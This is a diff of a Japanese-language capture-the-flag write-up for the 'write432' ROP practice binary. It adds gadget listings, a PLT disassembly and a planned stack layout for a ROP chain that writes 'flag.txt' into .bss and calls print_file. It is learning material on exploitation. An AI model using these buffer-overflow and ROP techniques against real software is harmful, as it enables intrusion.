@@ -139,6 +139,15 @@ fish: Process 105826, './write432' from job 1, 'python2 -c "print 'A' * 44 + '\�
 
 print_fileに飛ばしてあげようか
 
+```
+080483d0 <print_file@plt>:
+ 80483d0:       ff 25 14 a0 04 08       jmp    DWORD PTR ds:0x804a014
+ 80483d6:       68 10 00 00 00          push   0x10
+ 80483db:       e9 c0 ff ff ff          jmp    80483a0 <.plt>
+```
+
+
+
 print_file()の疑似コードはこんな感じになると思う　
 
 ```
@@ -212,20 +221,46 @@ gef➤
 
 ```
 
-あとは、usefulFadgetsに書き込みが可能になるようなGadgetがあるからそれ使っていくぜい。
+あとは、usefulFadgetsと組み合わせるGadgetがあるからそれ使っていくぜい。
+
+```
+❯ ROPgadget --binary write432 --only "pop|pop|ret"
+Gadgets information
+============================================================
+0x080485ab : pop ebp ; ret
+0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+0x0804839d : pop ebx ; ret
+0x080485aa : pop edi ; pop ebp ; ret
+0x080485a9 : pop esi ; pop edi ; pop ebp ; ret
+0x08048386 : ret
+0x0804849e : ret 0xeac1
+
+Unique gadgets found: 7
+```
+
+```pop ebp```のところを探すとちょうどいい感じのやつがあったのでそれを使う。
 
 一旦スタックの情報をまとめとく。
 
 | アドレス                    | 値             |
 | --------------------------- | -------------- |
 | esp#pwnme  ebp#pwnme - 0x28 |                |
-| ebp#pwnme                   | ...            |
+| ebp#pwnme                   | saved ebp      |
 | ebp#pwnme+0x4               | return address |
-| ebp#pwnme                   |                |
-|                             |                |
-|                             |                |
-|                             |                |
-|                             |                |
-|                             | AAAAAAAAAAAA   |
 
- 
+これをこういう形にするといい？
+|          アドレス           |                         値                          |
+| :-------------------------: | :-------------------------------------------------: |
+| esp#pwnme  ebp#pwnme - 0x28 |                      AAAA ...                       |
+|          ebp#pwnme          |                        AAAA                         |
+|        ebp#pwnme+0x4        | 0x080485aa(pop edi ; pop ebp ; ret)(return address) |
+|       ...  esp#[next]       |                 0804a020(bss_addr)                  |
+|             ...             |                       b"flag                        |
+|             ...             |              0x08048543(usefulGadgets)              |
+|             ...             | 0x080485aa(pop edi ; pop ebp ; ret)(return address) |
+|             ...             |                 804a024(bss_addr+4)                 |
+|             ...             |                       b".txt                        |
+|             ...             |              0x08048543(usefulGadgets)              |
+|             ...             |               0x080483d0(printf_file)               |
+|             ...             |                BBBB (return address)                |
+|             ...             |                 0804a020(bss_addr)                  |
